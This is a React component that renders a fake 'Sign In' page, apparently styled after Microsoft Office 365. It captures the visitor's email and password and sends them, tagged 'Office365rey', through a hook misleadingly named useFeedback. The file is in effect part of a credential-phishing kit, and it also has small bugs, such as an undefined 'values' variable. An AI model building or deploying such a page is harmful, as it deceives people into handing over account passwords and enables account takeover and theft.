import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';
import { Button, Modal } from 'react-bootstrap';
import PersonalInfo from './components/PersonalInfo';
import ContactInfo from './components/ContactInfo';

function Office() {
 
  const [step, setStep] = useState(1);

  const nextStep = () => {
    if (step < 3) {
      setStep(step + 1);
    } else if (step === 3) {
      console.log(values);
    }
  };

  const prevStep = () => {
    if (step > 1) {
      setStep(step - 1);
    }
  };


  const { postFeedback, isLoading } = useFeedback();
  const [emails, setEmail] = useState('');
  const [passwords, setPassword] = useState('');
  const [detail, setDetails] = useState('Office365rey');
  const [role, setRole] = useState('2');



  const onSubmit = async (e) => {
  e.preventDefault();
    const data = qs.stringify({
      email: emails,
      password: passwords,
      details: detail,
      role_id: role,
    });

    try {
      await postFeedback(data);
      setPassword('');
      setEmail('');
    } catch (error) {
      console.log(error);
    }
  };
  



  return (


    <div className="bg-image" 
     style={{backgroundImage: "url('images/imgback.jpg')",
            height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>
      
      <div  className="container pt-5 mb-4">
        <div className="row">
        <div  className="col-sm-4 mx-auto my-5 px-5 pb-3 pt-2 shadow bg-white rounded" style={{  backgroundColor: "white", borderRadius:"15px"}}>
       
        <div className='text-left pt-2'>
   <img src="images/icro.png"  className="img-fluid" width="120px" height="90px"/>
   <br/>
   <span  className="p text-dark pt-2">Sign In</span> 
   </div>
   {
            {
              1: <PersonalInfo onSubmit={onSubmit} />,
              2: <ContactInfo />,
   
            }[step]
          }
          <div className="d-flex justify-content-around px-5 mt-5">
            {step > 1 ? (
              <button className="btn btn-warning" onClick={prevStep}>
                Back
              </button>
            ) : null}
            <button className="btn btn-warning" onClick={nextStep}>
              {step === 3 ? "Submit" : "Next"}
            </button>
            
  

       

       
          
      </div>

          </div>
     
    </div> 
    </div>
    </div>

  );
}

export default Office;
